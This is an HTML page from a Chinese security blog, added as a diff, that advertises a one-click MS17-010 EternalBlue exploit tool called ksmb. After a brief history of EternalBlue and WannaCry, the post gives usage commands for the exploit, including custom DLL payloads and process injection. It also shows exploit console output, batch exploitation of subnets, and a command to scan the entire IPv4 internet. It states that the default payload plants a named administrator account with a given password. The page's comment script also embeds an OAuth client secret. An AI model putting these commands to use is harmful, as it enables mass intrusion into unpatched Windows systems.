@@ -1,0 +1,386 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="CVE-2020-17144,MS17010">
+
+
+<meta name="description" content="漏洞简介
+永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖EXP〗NSA MS17010永恒之蓝漏洞一键工具 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖EXP〗NSA MS17010永恒之蓝漏洞一键工具">
+            
+            〖EXP〗NSA MS17010永恒之蓝漏洞一键工具
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Exp/">Exp</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/CVE-2020-17144/" rel="tag">CVE-2020-17144</a> <a class="tag-none-link" href="/tags/MS17010/" rel="tag">MS17010</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/12/17</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1583</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="漏洞简介">漏洞简介</h3>
+<p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
+<h3 id="漏洞检测">漏洞检测</h3>
+<p>无损检测，不会对目标造成任何危害，大家无需担心</p>
+<p>Ladon 192.168.1.8 MS17010<br>
+Ladon 192.168.1.8/24 MS17010<br>
+Ladon 192.168.1.8/c MS17010</p>
+<p>检测发现存在漏洞高亮显示<br>
+<img alt="使用http访问查看图片" data-original="https://s2.ax1x.com/2020/01/12/lTg0Hg.gif"></p>
+<h3 id="独立使用">独立使用</h3>
+<p>只需提供IP或IP列表即可自动利用永恒之蓝,当然也可以使用Ladon来批量甚至全网</p>
+<p>PS: 由于当时漏洞影响很大，所以并未放出一键批量工具，现在4年过去了，还没打补丁就只能建议开除维护人员了，工具调用的是NSA原版的EXP，所以整个SMBSCAN目录里的文件基本上都是被杀的，这就不方便集成在Ladon里，以免Ladon被所有杀软杀。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop\SmbExp&gt;ksmb 192.168.1.89</span><br><span class="line">MS17010-EXP ETERNALBLUE by K8gege</span><br><span class="line"></span><br><span class="line">IP:  192.168.1.89</span><br><span class="line">OS:  64-bit 6.1 build 7601     Windows 2008 R2 Enterprise 7601 SP 1</span><br><span class="line">VUL: 3 (ETERNALBLUE     - DANE  ETERNALROMANCE  - FB    ETERNALCHAMPION - DANE/F</span><br><span class="line">B)</span><br><span class="line">EXP: Use Eternalblue &amp; Doublepulsar</span><br><span class="line">DLL: x64 Payload Injected</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="只IP默认445端口">只IP默认445端口</h4>
+<p>ksmb 192.168.1.89</p>
+<h4 id="自定义端口">自定义端口</h4>
+<p>ksmb 192.168.1.89 445<br>
+适用于代理出来打，不用考虑做免杀，而且免杀一堆文件也很麻烦</p>
+<h4 id="自定义DLL">自定义DLL</h4>
+<p>ksmb 192.168.1.89 445 mydll.dll</p>
+<h4 id="注入指定进程">注入指定进程</h4>
+<p>ksmb 192.168.1.89 445 mydll.dll explorer.exe</p>
+<h3 id="Ladon调用">Ladon调用</h3>
+<p>使用Ladon可轻松批量使用自己的POC，即只需要实现一个功能，剩下交给Ladon，不用每次来什么新洞都得浪费时间写批量利用工具。除了花一堆时间调式EXP，还得把它弄成批量，批量又得考虑多线程是否兼容POC里的代码等等问题，等写完时效性都过了。Ladon可批量主机、批量URL、批量网段、全网等等，非常方便，下面就是调用ms17010exp的例子。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop\SmbExp&gt;Ladon 192.168.1.89 ksmb.exe</span><br><span class="line">Ladon 7.5</span><br><span class="line">Start: 2020-12-17 23:40:16</span><br><span class="line">Runtime: .net 2.0  ME: x64 OS: x64</span><br><span class="line">OS Name: Microsoft Windows 8.1 Enterprise</span><br><span class="line">RunUser: k8gege PR: -IsUser</span><br><span class="line">PID: 5804  CurrentProcess: Ladon</span><br><span class="line"></span><br><span class="line">Call DiyMoudle (c# exe)</span><br><span class="line">load ksmb.exe</span><br><span class="line">ICMP: 192.168.1.89      00-0C-29-CF-FE-E1       VMware</span><br><span class="line">MS17010-EXP ETERNALBLUE by K8gege</span><br><span class="line"></span><br><span class="line">IP:  192.168.1.89</span><br><span class="line">OS:  64-bit 6.1 build 7601     Windows 2008 R2 Enterprise 7601 SP 1</span><br><span class="line">VUL: 3 (ETERNALBLUE     - DANE  ETERNALROMANCE  - FB    ETERNALCHAMPION - DANE/F</span><br><span class="line">B)</span><br><span class="line">EXP: Use Eternalblue &amp; Doublepulsar</span><br><span class="line">DLL: x64 Payload Injected</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="批量利用">批量利用</h4>
+<p>Ladon 192.168.1.89/c ksmb.exe<br>
+Ladon 192.168.1.89/24 ksmb.exe</p>
+<h4 id="全网扫描">全网扫描</h4>
+<p>Ladon 0.0.0.0-255.255.255.255 ksmb.exe</p>
+<h3 id="成功结果">成功结果</h3>
+<p>自带DLL会添加以下管理员用户<br>
+k8ms17010exp K8gege520!@#</p>
+<p>可替换DLL，执行自定义功能</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exp/MS17010_EXP.PNG"></p>
+<h3 id="下载">下载</h3>
+<p>EXP小密圈内下载</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/LadonNC.html" class="pre-post btn btn-default" title="〖工具〗NC执行PowerShell/内存加载Ladon扫描">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖工具〗NC执行PowerShell/内存加载Ladon扫描</span>
+    </a>
+    
+    
+    <a href="/p/CVE-2020-17144.html" class="next-post btn btn-default" title="〖EXP〗CVE-2020-17144 Exchange漏洞利用">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖EXP〗CVE-2020-17144 Exchange漏洞利用</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8"><span class="toc-text">独立使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AAIP%E9%BB%98%E8%AE%A4445%E7%AB%AF%E5%8F%A3"><span class="toc-text">只IP默认445端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%AB%AF%E5%8F%A3"><span class="toc-text">自定义端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89DLL"><span class="toc-text">自定义DLL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B"><span class="toc-text">注入指定进程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E8%B0%83%E7%94%A8"><span class="toc-text">Ladon调用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8"><span class="toc-text">批量利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-text">全网扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%BB%93%E6%9E%9C"><span class="toc-text">成功结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-text">下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
